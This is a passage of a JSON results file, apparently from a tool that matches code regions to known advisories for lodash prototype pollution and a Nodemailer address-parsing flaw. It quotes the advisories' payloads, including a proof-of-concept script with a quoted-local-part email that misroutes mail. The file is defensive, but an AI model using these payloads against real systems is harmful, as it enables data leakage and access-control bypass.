+              "candidate_region_id": "candidate:T2-0ad8e84352303d8c8832:0004",
+              "candidate_granularity": "context",
+              "corpus_granularity": "context",
+              "ghsa_id": "GHSA-4xc9-xhrj-v574",
+              "cve_id": "CVE-2018-16487",
+              "cwes": [
+                {
+                  "cwe_id": "CWE-400",
+                  "name": "Uncontrolled Resource Consumption"
+                }
+              ],
+              "severity": "high",
+              "advisory_title": "Prototype Pollution in lodash",
+              "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+              "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+              "advisory_references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                "https://hackerone.com/reports/380873",
+                "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                "https://security.netapp.com/advisory/ntap-20190919-0004",
+                "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+              ],
+              "osv_id": "GHSA-4xc9-xhrj-v574",
+              "package_name": "lodash",
+              "ecosystem": "npm",
+              "affected_versions": [],
+              "fixed_versions": [
+                "4.17.11"
+              ],
+              "fix_commit_sha": "90e6199a161b6445b01454517b40ef65ebecd2ad",
+              "file_path": "lodash.js",
+              "function_name": "safeGet",
+              "source_language": "javascript"
+            },
+            {
+              "pair_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:context",
+              "lineage_id": "lineage-5a49dd3ede1a384fc6fae2e6e879bdaadd145793834795b545b74f55ebbf8e3a",
+              "fix_boundary_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c",
+              "reference_side": "patched",
+              "advisories": [
+                {
+                  "ghsa_id": "GHSA-4xc9-xhrj-v574",
+                  "cve_id": "CVE-2018-16487",
+                  "cwes": [
+                    {
+                      "cwe_id": "CWE-400",
+                      "name": "Uncontrolled Resource Consumption"
+                    }
+                  ],
+                  "severity": "high",
+                  "advisory_title": "Prototype Pollution in lodash",
+                  "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+                  "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+                  "advisory_references": [
+                    "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                    "https://hackerone.com/reports/380873",
+                    "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                    "https://security.netapp.com/advisory/ntap-20190919-0004",
+                    "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                    "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+                  ],
+                  "osv_id": "GHSA-4xc9-xhrj-v574",
+                  "package_name": "lodash",
+                  "ecosystem": "npm",
+                  "affected_versions": [],
+                  "fixed_versions": [
+                    "4.17.11"
+                  ]
+                }
+              ],
+              "similarity": 0.9281011819839478,
+              "rank": 1,
+              "candidate_region_id": "candidate:T2-0ad8e84352303d8c8832:0011",
+              "candidate_granularity": "context",
+              "corpus_granularity": "context",
+              "ghsa_id": "GHSA-4xc9-xhrj-v574",
+              "cve_id": "CVE-2018-16487",
+              "cwes": [
+                {
+                  "cwe_id": "CWE-400",
+                  "name": "Uncontrolled Resource Consumption"
+                }
+              ],
+              "severity": "high",
+              "advisory_title": "Prototype Pollution in lodash",
+              "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+              "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+              "advisory_references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                "https://hackerone.com/reports/380873",
+                "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                "https://security.netapp.com/advisory/ntap-20190919-0004",
+                "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+              ],
+              "osv_id": "GHSA-4xc9-xhrj-v574",
+              "package_name": "lodash",
+              "ecosystem": "npm",
+              "affected_versions": [],
+              "fixed_versions": [
+                "4.17.11"
+              ],
+              "fix_commit_sha": "90e6199a161b6445b01454517b40ef65ebecd2ad",
+              "file_path": "lodash.js",
+              "function_name": "safeGet",
+              "source_language": "javascript"
+            },
+            {
+              "pair_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:context",
+              "lineage_id": "lineage-5a49dd3ede1a384fc6fae2e6e879bdaadd145793834795b545b74f55ebbf8e3a",
+              "fix_boundary_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c",
+              "reference_side": "patched",
+              "advisories": [
+                {
+                  "ghsa_id": "GHSA-4xc9-xhrj-v574",
+                  "cve_id": "CVE-2018-16487",
+                  "cwes": [
+                    {
+                      "cwe_id": "CWE-400",
+                      "name": "Uncontrolled Resource Consumption"
+                    }
+                  ],
+                  "severity": "high",
+                  "advisory_title": "Prototype Pollution in lodash",
+                  "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+                  "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+                  "advisory_references": [
+                    "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                    "https://hackerone.com/reports/380873",
+                    "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                    "https://security.netapp.com/advisory/ntap-20190919-0004",
+                    "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                    "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+                  ],
+                  "osv_id": "GHSA-4xc9-xhrj-v574",
+                  "package_name": "lodash",
+                  "ecosystem": "npm",
+                  "affected_versions": [],
+                  "fixed_versions": [
+                    "4.17.11"
+                  ]
+                }
+              ],
+              "similarity": 0.8907341957092285,
+              "rank": 1,
+              "candidate_region_id": "candidate:T2-0ad8e84352303d8c8832:0013",
+              "candidate_granularity": "context",
+              "corpus_granularity": "context",
+              "ghsa_id": "GHSA-4xc9-xhrj-v574",
+              "cve_id": "CVE-2018-16487",
+              "cwes": [
+                {
+                  "cwe_id": "CWE-400",
+                  "name": "Uncontrolled Resource Consumption"
+                }
+              ],
+              "severity": "high",
+              "advisory_title": "Prototype Pollution in lodash",
+              "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+              "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+              "advisory_references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                "https://hackerone.com/reports/380873",
+                "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                "https://security.netapp.com/advisory/ntap-20190919-0004",
+                "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+              ],
+              "osv_id": "GHSA-4xc9-xhrj-v574",
+              "package_name": "lodash",
+              "ecosystem": "npm",
+              "affected_versions": [],
+              "fixed_versions": [
+                "4.17.11"
+              ],
+              "fix_commit_sha": "90e6199a161b6445b01454517b40ef65ebecd2ad",
+              "file_path": "lodash.js",
+              "function_name": "safeGet",
+              "source_language": "javascript"
+            }
+          ],
+          "support_count": 6
+        },
+        {
+          "pair_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:block",
+          "lineage_id": "lineage-5a49dd3ede1a384fc6fae2e6e879bdaadd145793834795b545b74f55ebbf8e3a",
+          "fix_boundary_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c",
+          "best_similarity": 0.9660431146621704,
+          "candidate_region_ids": [
+            "candidate:T2-0ad8e84352303d8c8832:0007",
+            "candidate:T2-0ad8e84352303d8c8832:0014"
+          ],
+          "granularities": [
+            "block",
+            "changed"
+          ],
+          "top_matches": [
+            {
+              "pair_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:block",
+              "lineage_id": "lineage-5a49dd3ede1a384fc6fae2e6e879bdaadd145793834795b545b74f55ebbf8e3a",
+              "fix_boundary_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c",
+              "reference_side": "vulnerable",
+              "advisories": [
+                {
+                  "ghsa_id": "GHSA-4xc9-xhrj-v574",
+                  "cve_id": "CVE-2018-16487",
+                  "cwes": [
+                    {
+                      "cwe_id": "CWE-400",
+                      "name": "Uncontrolled Resource Consumption"
+                    }
+                  ],
+                  "severity": "high",
+                  "advisory_title": "Prototype Pollution in lodash",
+                  "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+                  "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+                  "advisory_references": [
+                    "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                    "https://hackerone.com/reports/380873",
+                    "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                    "https://security.netapp.com/advisory/ntap-20190919-0004",
+                    "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                    "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+                  ],
+                  "osv_id": "GHSA-4xc9-xhrj-v574",
+                  "package_name": "lodash",
+                  "ecosystem": "npm",
+                  "affected_versions": [],
+                  "fixed_versions": [
+                    "4.17.11"
+                  ]
+                }
+              ],
+              "similarity": 0.9660431146621704,
+              "rank": 1,
+              "candidate_region_id": "candidate:T2-0ad8e84352303d8c8832:0007",
+              "candidate_granularity": "block",
+              "corpus_granularity": "block",
+              "ghsa_id": "GHSA-4xc9-xhrj-v574",
+              "cve_id": "CVE-2018-16487",
+              "cwes": [
+                {
+                  "cwe_id": "CWE-400",
+                  "name": "Uncontrolled Resource Consumption"
+                }
+              ],
+              "severity": "high",
+              "advisory_title": "Prototype Pollution in lodash",
+              "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+              "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+              "advisory_references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                "https://hackerone.com/reports/380873",
+                "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                "https://security.netapp.com/advisory/ntap-20190919-0004",
+                "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+              ],
+              "osv_id": "GHSA-4xc9-xhrj-v574",
+              "package_name": "lodash",
+              "ecosystem": "npm",
+              "affected_versions": [],
+              "fixed_versions": [
+                "4.17.11"
+              ],
+              "fix_commit_sha": "90e6199a161b6445b01454517b40ef65ebecd2ad",
+              "file_path": "lodash.js",
+              "function_name": "safeGet",
+              "source_language": "javascript"
+            },
+            {
+              "pair_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:block",
+              "lineage_id": "lineage-5a49dd3ede1a384fc6fae2e6e879bdaadd145793834795b545b74f55ebbf8e3a",
+              "fix_boundary_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c",
+              "reference_side": "vulnerable",
+              "advisories": [
+                {
+                  "ghsa_id": "GHSA-4xc9-xhrj-v574",
+                  "cve_id": "CVE-2018-16487",
+                  "cwes": [
+                    {
+                      "cwe_id": "CWE-400",
+                      "name": "Uncontrolled Resource Consumption"
+                    }
+                  ],
+                  "severity": "high",
+                  "advisory_title": "Prototype Pollution in lodash",
+                  "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+                  "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+                  "advisory_references": [
+                    "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                    "https://hackerone.com/reports/380873",
+                    "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                    "https://security.netapp.com/advisory/ntap-20190919-0004",
+                    "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                    "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+                  ],
+                  "osv_id": "GHSA-4xc9-xhrj-v574",
+                  "package_name": "lodash",
+                  "ecosystem": "npm",
+                  "affected_versions": [],
+                  "fixed_versions": [
+                    "4.17.11"
+                  ]
+                }
+              ],
+              "similarity": 0.8778913617134094,
+              "rank": 1,
+              "candidate_region_id": "candidate:T2-0ad8e84352303d8c8832:0014",
+              "candidate_granularity": "changed",
+              "corpus_granularity": "block",
+              "ghsa_id": "GHSA-4xc9-xhrj-v574",
+              "cve_id": "CVE-2018-16487",
+              "cwes": [
+                {
+                  "cwe_id": "CWE-400",
+                  "name": "Uncontrolled Resource Consumption"
+                }
+              ],
+              "severity": "high",
+              "advisory_title": "Prototype Pollution in lodash",
+              "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+              "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+              "advisory_references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                "https://hackerone.com/reports/380873",
+                "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                "https://security.netapp.com/advisory/ntap-20190919-0004",
+                "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+              ],
+              "osv_id": "GHSA-4xc9-xhrj-v574",
+              "package_name": "lodash",
+              "ecosystem": "npm",
+              "affected_versions": [],
+              "fixed_versions": [
+                "4.17.11"
+              ],
+              "fix_commit_sha": "90e6199a161b6445b01454517b40ef65ebecd2ad",
+              "file_path": "lodash.js",
+              "function_name": "safeGet",
+              "source_language": "javascript"
+            }
+          ],
+          "support_count": 2
+        },
+        {
+          "pair_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:function",
+          "lineage_id": "lineage-5a49dd3ede1a384fc6fae2e6e879bdaadd145793834795b545b74f55ebbf8e3a",
+          "fix_boundary_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c",
+          "best_similarity": 0.9442534446716309,
+          "candidate_region_ids": [
+            "candidate:T2-0ad8e84352303d8c8832:0016"
+          ],
+          "granularities": [
+            "function"
+          ],
+          "top_matches": [
+            {
+              "pair_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:function",
+              "lineage_id": "lineage-5a49dd3ede1a384fc6fae2e6e879bdaadd145793834795b545b74f55ebbf8e3a",
+              "fix_boundary_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c",
+              "reference_side": "patched",
+              "advisories": [
+                {
+                  "ghsa_id": "GHSA-4xc9-xhrj-v574",
+                  "cve_id": "CVE-2018-16487",
+                  "cwes": [
+                    {
+                      "cwe_id": "CWE-400",
+                      "name": "Uncontrolled Resource Consumption"
+                    }
+                  ],
+                  "severity": "high",
+                  "advisory_title": "Prototype Pollution in lodash",
+                  "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+                  "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+                  "advisory_references": [
+                    "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                    "https://hackerone.com/reports/380873",
+                    "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                    "https://security.netapp.com/advisory/ntap-20190919-0004",
+                    "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                    "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+                  ],
+                  "osv_id": "GHSA-4xc9-xhrj-v574",
+                  "package_name": "lodash",
+                  "ecosystem": "npm",
+                  "affected_versions": [],
+                  "fixed_versions": [
+                    "4.17.11"
+                  ]
+                }
+              ],
+              "similarity": 0.9442534446716309,
+              "rank": 1,
+              "candidate_region_id": "candidate:T2-0ad8e84352303d8c8832:0016",
+              "candidate_granularity": "function",
+              "corpus_granularity": "function",
+              "ghsa_id": "GHSA-4xc9-xhrj-v574",
+              "cve_id": "CVE-2018-16487",
+              "cwes": [
+                {
+                  "cwe_id": "CWE-400",
+                  "name": "Uncontrolled Resource Consumption"
+                }
+              ],
+              "severity": "high",
+              "advisory_title": "Prototype Pollution in lodash",
+              "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+              "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+              "advisory_references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                "https://hackerone.com/reports/380873",
+                "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                "https://security.netapp.com/advisory/ntap-20190919-0004",
+                "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+              ],
+              "osv_id": "GHSA-4xc9-xhrj-v574",
+              "package_name": "lodash",
+              "ecosystem": "npm",
+              "affected_versions": [],
+              "fixed_versions": [
+                "4.17.11"
+              ],
+              "fix_commit_sha": "90e6199a161b6445b01454517b40ef65ebecd2ad",
+              "file_path": "lodash.js",
+              "function_name": "safeGet",
+              "source_language": "javascript"
+            }
+          ],
+          "support_count": 1
+        },
+        {
+          "pair_id": "boundary-77036393e97e485ad4a8ab2d0705cce2f6c2bc5febafee558f13e7ebb76286cb:changed",
+          "lineage_id": "lineage-e9c5ea48bd7c56549910dd63ab88121bcb3199f31519efb6258765e3de3a3cb9",
+          "fix_boundary_id": "boundary-77036393e97e485ad4a8ab2d0705cce2f6c2bc5febafee558f13e7ebb76286cb",
+          "best_similarity": 0.870469331741333,
+          "candidate_region_ids": [
+            "candidate:T2-0ad8e84352303d8c8832:0006"
+          ],
+          "granularities": [
+            "changed"
+          ],
+          "top_matches": [
+            {
+              "pair_id": "boundary-77036393e97e485ad4a8ab2d0705cce2f6c2bc5febafee558f13e7ebb76286cb:changed",
+              "lineage_id": "lineage-e9c5ea48bd7c56549910dd63ab88121bcb3199f31519efb6258765e3de3a3cb9",
+              "fix_boundary_id": "boundary-77036393e97e485ad4a8ab2d0705cce2f6c2bc5febafee558f13e7ebb76286cb",
+              "reference_side": "vulnerable",
+              "advisories": [
+                {
+                  "ghsa_id": "GHSA-mm7p-fcc7-pg87",
+                  "cve_id": "CVE-2025-13033",
+                  "cwes": [
+                    {
+                      "cwe_id": "CWE-20",
+                      "name": "Improper Input Validation"
+                    },
+                    {
+                      "cwe_id": "CWE-436",
+                      "name": "Interpretation Conflict"
+                    }
+                  ],
+                  "severity": "medium",
+                  "advisory_title": "Nodemailer: Email to an unintended domain can occur due to Interpretation Conflict",
+                  "advisory_description": "The email parsing library incorrectly handles quoted local-parts containing @. This leads to misrouting of email recipients, where the parser extracts and routes to an unintended domain instead of the RFC-compliant target.\n\nPayload: `\"xclow3n@gmail.com x\"@internal.domain`\nUsing the following code to send mail\n```\nconst nodemailer = require(\"nodemailer\");\n\nlet transporter = nodemailer.createTransport({\n  service: \"gmail\",\n  auth: {\n    user: \"\",\n    pass: \"\",\n  },\n});\n\nlet mailOptions = {\n  from: '\"Test Sender\" <your_email@gmail.com>', \n  to: \"\\\"xclow3n@gmail.com x\\\"@internal.domain\",\n  subject: \"Hello from Nodemailer\",\n  text: \"This is a test email sent using Gmail SMTP and Nodemailer!\",\n};\n\ntransporter.sendMail(mailOptions, (error, info) => {\n  if (error) {\n    return console.log(\"Error: \", error);\n  }\n  console.log(\"Message sent: %s\", info.messageId);\n\n});\n\n\n(async () => {\n  const parser = await import(\"@sparser/email-address-parser\");\n  const { EmailAddress, ParsingOptions } = parser.default;\n  const parsed = EmailAddress.parse(mailOptions.to /*, new ParsingOptions(true) */);\n\n  if (!parsed) {\n    console.error(\"Invalid email address:\", mailOptions.to);\n    return;\n  }\n\n  console.log(\"Parsed email:\", {\n    address: `${parsed.localPart}@${parsed.domain}`,\n    local: parsed.localPart,\n    domain: parsed.domain,\n  });\n})();\n```\n\nRunning the script and seeing how this mail is parsed according to RFC\n\n```\nParsed email: {\n  address: '\"xclow3n@gmail.com x\"@internal.domain',\n  local: '\"xclow3n@gmail.com x\"',\n  domain: 'internal.domain'\n}\n```\n\nBut the email is sent to `xclow3n@gmail.com`\n\n<img width=\"2128\" height=\"439\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/20eb459c-9803-45a2-b30e-5d1177d60a8d\" />\n\n\n### Impact:\n\n-    Misdelivery / Data leakage: Email is sent to psres.net instead of test.com.\n\n-    Filter evasion: Logs and anti-spam systems may be bypassed by hiding recipients inside quoted local-parts.\n\n-    Potential compliance issue: Violates RFC 5321/5322 parsing rules.\n\n-    Domain based access control bypass in downstream applications using your library to send mails\n\n### Recommendations\n\n-    Fix parser to correctly treat quoted local-parts per RFC 5321/5322.\n\n-    Add strict validation rejecting local-parts containing embedded @ unless fully compliant with quoting.",
+                  "advisory_url": "https://github.com/advisories/GHSA-mm7p-fcc7-pg87",
+                  "advisory_references": [
+                    "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-mm7p-fcc7-pg87",
+                    "https://github.com/nodemailer/nodemailer/commit/1150d99fba77280df2cfb1885c43df23109a8626",
+                    "https://nvd.nist.gov/vuln/detail/CVE-2025-13033",
+                    "https://access.redhat.com/security/cve/CVE-2025-13033",
+                    "https://bugzilla.redhat.com/show_bug.cgi?id=2402179",
+                    "https://github.com/advisories/GHSA-mm7p-fcc7-pg87"
+                  ],
+                  "osv_id": "GHSA-mm7p-fcc7-pg87",
+                  "package_name": "nodemailer",
+                  "ecosystem": "npm",
+                  "affected_versions": [],
+                  "fixed_versions": [
+                    "7.0.7"
+                  ]
+                }
+              ],
+              "similarity": 0.870469331741333,
+              "rank": 1,
+              "candidate_region_id": "candidate:T2-0ad8e84352303d8c8832:0006",
+              "candidate_granularity": "changed",
+              "corpus_granularity": "changed",
+              "ghsa_id": "GHSA-mm7p-fcc7-pg87",
+              "cve_id": "CVE-2025-13033",
+              "cwes": [
+                {
+                  "cwe_id": "CWE-20",
+                  "name": "Improper Input Validation"
+                },
+                {
+                  "cwe_id": "CWE-436",
+                  "name": "Interpretation Conflict"
+                }
+              ],
+              "severity": "medium",
+              "advisory_title": "Nodemailer: Email to an unintended domain can occur due to Interpretation Conflict",
+              "advisory_description": "The email parsing library incorrectly handles quoted local-parts containing @. This leads to misrouting of email recipients, where the parser extracts and routes to an unintended domain instead of the RFC-compliant target.\n\nPayload: `\"xclow3n@gmail.com x\"@internal.domain`\nUsing the following code to send mail\n```\nconst nodemailer = require(\"nodemailer\");\n\nlet transporter = nodemailer.createTransport({\n  service: \"gmail\",\n  auth: {\n    user: \"\",\n    pass: \"\",\n  },\n});\n\nlet mailOptions = {\n  from: '\"Test Sender\" <your_email@gmail.com>', \n  to: \"\\\"xclow3n@gmail.com x\\\"@internal.domain\",\n  subject: \"Hello from Nodemailer\",\n  text: \"This is a test email sent using Gmail SMTP and Nodemailer!\",\n};\n\ntransporter.sendMail(mailOptions, (error, info) => {\n  if (error) {\n    return console.log(\"Error: \", error);\n  }\n  console.log(\"Message sent: %s\", info.messageId);\n\n});\n\n\n(async () => {\n  const parser = await import(\"@sparser/email-address-parser\");\n  const { EmailAddress, ParsingOptions } = parser.default;\n  const parsed = EmailAddress.parse(mailOptions.to /*, new ParsingOptions(true) */);\n\n  if (!parsed) {\n    console.error(\"Invalid email address:\", mailOptions.to);\n    return;\n  }\n\n  console.log(\"Parsed email:\", {\n    address: `${parsed.localPart}@${parsed.domain}`,\n    local: parsed.localPart,\n    domain: parsed.domain,\n  });\n})();\n```\n\nRunning the script and seeing how this mail is parsed according to RFC\n\n```\nParsed email: {\n  address: '\"xclow3n@gmail.com x\"@internal.domain',\n  local: '\"xclow3n@gmail.com x\"',\n  domain: 'internal.domain'\n}\n```\n\nBut the email is sent to `xclow3n@gmail.com`\n\n<img width=\"2128\" height=\"439\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/20eb459c-9803-45a2-b30e-5d1177d60a8d\" />\n\n\n### Impact:\n\n-    Misdelivery / Data leakage: Email is sent to psres.net instead of test.com.\n\n-    Filter evasion: Logs and anti-spam systems may be bypassed by hiding recipients inside quoted local-parts.\n\n-    Potential compliance issue: Violates RFC 5321/5322 parsing rules.\n\n-    Domain based access control bypass in downstream applications using your library to send mails\n\n### Recommendations\n\n-    Fix parser to correctly treat quoted local-parts per RFC 5321/5322.\n\n-    Add strict validation rejecting local-parts containing embedded @ unless fully compliant with quoting.",
+              "advisory_url": "https://github.com/advisories/GHSA-mm7p-fcc7-pg87",
+              "advisory_references": [
+                "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-mm7p-fcc7-pg87",
+                "https://github.com/nodemailer/nodemailer/commit/1150d99fba77280df2cfb1885c43df23109a8626",
+                "https://nvd.nist.gov/vuln/detail/CVE-2025-13033",
+                "https://access.redhat.com/security/cve/CVE-2025-13033",
+                "https://bugzilla.redhat.com/show_bug.cgi?id=2402179",
+                "https://github.com/advisories/GHSA-mm7p-fcc7-pg87"
+              ],
+              "osv_id": "GHSA-mm7p-fcc7-pg87",
+              "package_name": "nodemailer",
+              "ecosystem": "npm",
+              "affected_versions": [],
+              "fixed_versions": [
+                "7.0.7"
+              ],
+              "fix_commit_sha": "1150d99fba77280df2cfb1885c43df23109a8626",
+              "file_path": "lib/addressparser/index.js",
+              "function_name": "_handleAddress",
+              "source_language": "javascript"
+            }
+          ],
+          "support_count": 1
+        }
+      ],
+      "evidence": [
+        {
+          "pair_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:changed",
+          "retrieval_similarity": 0.995629608631134,
+          "candidate_region_id": "candidate:T2-0ad8e84352303d8c8832:0000",
+          "candidate_span": {
+            "start_byte": 34,
+            "end_byte": 86,
+            "start_line": 1,
+            "end_line": 3
+          },
+          "candidate_granularity": "changed",
+          "candidate_function_name": "safeGet",
+          "vulnerable_region_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:changed:vulnerable",
+          "patched_region_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:changed:patched",
+          "reference_granularity": "changed",
+          "structural_vulnerable": 0.5964912280701754,
